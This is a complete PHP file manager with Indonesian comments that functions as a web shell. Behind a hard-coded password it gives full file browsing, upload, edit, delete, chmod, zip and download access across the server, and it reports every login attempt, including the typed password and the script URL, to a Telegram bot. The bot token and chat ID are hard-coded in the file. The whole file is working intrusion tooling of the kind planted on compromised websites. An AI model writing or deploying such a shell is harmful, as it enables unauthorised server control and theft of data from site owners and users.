<?php
// ======= DEBUG MODE =======
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ======= KONFIG TELEGRAM =======
define('TG_BOT_TOKEN', '8055884841:AAG_-0dw0NJ5nk2fhOFPDDNh0ciX0T3SCuI'); // Ganti token bot lo
define('TG_CHAT_ID', '1883446251');     // Ganti chat id lo
// ===============================

// ======= PASSWORD LOGIN =======
$pass = "nullcyber0";
// =============================

session_start();

// ---- URL SCRIPT FUNCTION ----
function current_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
    $host     = $_SERVER['HTTP_HOST'];
    $script   = $_SERVER['SCRIPT_NAME'];
    return $protocol . '://' . $host . $script;
}

// ------- FUNGSI KIRIM TELEGRAM -------
function telegram_send($msg) {
    $token = TG_BOT_TOKEN;
    $chat_id = TG_CHAT_ID;
    $text = urlencode($msg);
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$text";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
}

// --- Ambil path dari GET (pakai base64) ---
if (isset($_GET['path'])) {
    $get_path = $_GET['path'];
    if (base64_decode($get_path, true) !== false) {
        $path = base64_decode($get_path);
    } else {
        $path = $get_path;
    }
} else {
    $path = getcwd();
}
$path = safe_path($path);
chdir($path);

// --- LOGIN + NOTIF TELEGRAM ---
if ($pass && !isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['pwd'])) {
        $user_ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
        $try_time = date("Y-m-d H:i:s");
        $try_pwd = $_POST['pwd'];
        $success = ($try_pwd === $pass) ? "SUKSES" : "GAGAL";
        $url = current_url();
        $msg = "Percobaan Login File Manager:
IP: $user_ip
Waktu: $try_time
User-Agent: $user_agent
Password: $try_pwd
Status: $success
URL: $url";
        telegram_send($msg);

        if ($try_pwd === $pass) {
            $_SESSION['logged_in'] = true;
            header("Location: ?");
            exit;
        }
    }
    echo "<form method='post'><input type='password' name='pwd' autofocus placeholder='Password'><input type='submit' value='Login'></form>";
    exit;
}

// --------- BREADCRUMB FUNCTION --------
function breadcrumb($fullpath) {
    $parts = explode(DIRECTORY_SEPARATOR, $fullpath);
    $accum = '';
    $links = [];
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $drive = array_shift($parts);
        $accum = $drive . DIRECTORY_SEPARATOR;
        $links[] = "<a href='?path=" . base64_encode($accum) . "'>$drive</a>";
    }
    foreach ($parts as $part) {
        if ($part === '' || $part === DIRECTORY_SEPARATOR) continue;
        $accum .= $part . DIRECTORY_SEPARATOR;
        $links[] = "<a href='?path=" . base64_encode(rtrim($accum, DIRECTORY_SEPARATOR)) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode(" / ", $links);
}
function perms($file) {
    $perms = fileperms($file);
    $info = ($perms & 0x1000) ? 'p' :
       (($perms & 0x2000) ? 'c' :
       (($perms & 0x4000) ? 'd' :
       (($perms & 0x6000) ? 'b' :
       (($perms & 0x8000) ? '-' :
       (($perms & 0xA000) ? 'l' :
       (($perms & 0xC000) ? 's' : 'u'))))));
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
    return $info;
}
function fsize($bytes) {
    $sizes = ['B','KB','MB','GB','TB'];
    for ($i=0; $bytes>=1024 && $i<4; $i++) $bytes/=1024;
    return round($bytes,2).' '.$sizes[$i];
}
function safe_path($p) {
    $real = realpath($p);
    if ($real === false) $real = getcwd();
    return $real;
}

// --- Tambah file/folder ---
if (isset($_POST['newfile']) && $_POST['newfile'] != '') {
    $filename = basename(trim($_POST['newfile']));
    $fullpath = $path . DIRECTORY_SEPARATOR . $filename;
    if (!file_exists($fullpath)) {
        file_put_contents($fullpath, $_POST['filecontent'] ?? '');
    }
    header("Location: ?path=" . base64_encode($path));
    exit;
}
if (isset($_POST['newfolder']) && $_POST['newfolder'] != '') {
    $foldername = basename(trim($_POST['newfolder']));
    $fullpath = $path . DIRECTORY_SEPARATOR . $foldername;
    if (!file_exists($fullpath)) {
        mkdir($fullpath);
    }
    header("Location: ?path=" . base64_encode($path));
    exit;
}

// --- Aksi lain (delete, edit, rename, chmod, zip, unzip, upload) ---
if (isset($_GET['delete'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['delete'];
    is_dir($target) ? @rmdir($target) : @unlink($target);
    header("Location: ?path=" . base64_encode($path));
    exit;
}
if (isset($_GET['download'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['download'];
    if (is_file($target)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($target).'"');
        header('Content-Length: ' . filesize($target));
        readfile($target);
        exit;
    }
}
if (isset($_GET['edit'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=" . base64_encode($path));
        exit;
    }
    echo "<h2>Edit File: " . htmlspecialchars($_GET['edit']) . "</h2>";
    echo "<form method='post'><textarea name='content' rows='20' cols='80'>" . htmlspecialchars(@file_get_contents($file)) . "</textarea><br><input type='submit' value='Save'></form>";
    exit;
}
if (isset($_GET['rename'])) {
    $old = $path . DIRECTORY_SEPARATOR . $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $new = $path . DIRECTORY_SEPARATOR . $_POST['newname'];
        rename($old, $new);
        header("Location: ?path=" . base64_encode($path));
        exit;
    }
    echo "<h2>Rename: " . htmlspecialchars($_GET['rename']) . "</h2>";
    echo "<form method='post'><input name='newname' value='" . htmlspecialchars($_GET['rename']) . "'><input type='submit' value='Rename'></form>";
    exit;
}
if (isset($_GET['chmod'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        chmod($target, octdec($_POST['mode']));
        header("Location: ?path=" . base64_encode($path));
        exit;
    }
    echo "<h2>Chmod: " . htmlspecialchars($_GET['chmod']) . "</h2>";
    echo "<form method='post'><input name='mode' value='" . substr(sprintf('%o', @fileperms($target)), -4) . "'><input type='submit' value='Change'></form>";
    exit;
}
if (isset($_GET['zip'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['zip'];
    $zipname = basename($target) . ".zip";
    $zip = new ZipArchive;
    if ($zip->open($zipname, ZipArchive::CREATE) === TRUE) {
        if (is_file($target)) {
            $zip->addFile($target, basename($target));
        } else {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($target) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        }
        $zip->close();
    }
    header("Location: ?path=" . base64_encode($path));
    exit;
}
if (isset($_GET['unzip'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['unzip'];
    $zip = new ZipArchive;
    if ($zip->open($target) === TRUE) {
        $zip->extractTo($path);
        $zip->close();
    }
    header("Location: ?path=" . base64_encode($path));
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadfile'])) {
    $dest = $path . '/' . basename($_FILES['uploadfile']['name']);
    move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
    header("Location: ?path=" . base64_encode($path));
    exit;
}

// --- Tampilan ---
echo "<h2>File Manager - " . breadcrumb($path) . "</h2>";
$parent = dirname($path);
if ($parent && $parent !== $path) {
    echo "<a href='?path=" . base64_encode($parent) . "'>⬆️ Up</a> | ";
}
echo "<a href='?logout=1' onclick=\"return confirm('Logout?')\">Logout</a>";

// ======= Form Tambah File & Folder =======
echo "<form method='post' style='margin:10px 0; display:inline-block'>
    <b>Create File:</b> <input name='newfile' placeholder='Name file'>
    <input type='submit' value='Create'><br>
    <textarea name='filecontent' placeholder='content file (optional)' rows='3' cols='50'></textarea>
</form>";
echo "&nbsp;&nbsp;";
echo "<form method='post' style='margin:10px 0; display:inline-block'>
    <b>Create Folder:</b> <input name='newfolder' placeholder='Name folder'>
    <input type='submit' value='Create'>
</form>";

echo "<form method='post' enctype='multipart/form-data' style='margin:8px 0'>
    <input type='file' name='uploadfile'>
    <input type='submit' value='Upload'>
</form>";

echo "<table border='1' cellpadding='4' style='border-collapse:collapse; min-width:60%;'><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>";

foreach (scandir($path) as $item) {
    if ($item == '.') continue;
    $item_esc = htmlspecialchars($item);
    $url_item = urlencode($item);
    $fullpath = $path . DIRECTORY_SEPARATOR . $item;
    echo "<tr>";
    echo "<td>";
    if (is_dir($fullpath)) {
        echo "<a href='?path=" . base64_encode($fullpath) . "'>$item_esc</a>";
    } else {
        echo "<a href='?path=" . base64_encode($path) . "&download=$url_item'>$item_esc</a>";
    }
    echo "</td>";
    echo "<td>" . (is_dir($fullpath) ? 'DIR' : fsize(filesize($fullpath))) . "</td>";
    echo "<td>" . perms($fullpath) . "</td>";
    echo "<td>";
    echo "<a href='?path=" . base64_encode($path) . "&rename=$url_item'>Rename</a> | ";
    echo "<a href='?path=" . base64_encode($path) . "&delete=$url_item' onclick=\"return confirm('Delete $item_esc?')\">Delete</a> | ";
    if (!is_dir($fullpath)) {
        echo "<a href='?path=" . base64_encode($path) . "&edit=$url_item'>Edit</a> | ";
    }
    echo "<a href='?path=" . base64_encode($path) . "&chmod=$url_item'>Chmod</a> | ";
    echo "<a href='?path=" . base64_encode($path) . "&zip=$url_item'>Zip</a> ";
    if (pathinfo($item, PATHINFO_EXTENSION) === 'zip') {
        echo "| <a href='?path=" . base64_encode($path) . "&unzip=$url_item'>Unzip</a>";
    }
    echo "</td>";
    echo "</tr>";
}
echo "</table>";

// --- Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}
?>
